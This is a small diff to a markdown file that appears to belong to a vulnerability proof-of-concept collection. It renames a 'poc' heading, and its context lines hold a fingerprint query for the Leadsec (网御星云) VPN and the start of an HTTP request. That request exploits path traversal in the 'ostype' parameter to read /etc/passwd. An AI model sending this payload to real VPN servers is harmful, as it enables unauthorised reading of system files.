@@ -11,7 +11,7 @@ app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input"
 
 ![image-20240713133021846](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407131330925.png)
 
-## poc
+## POC
 
 ```yaml
 GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1
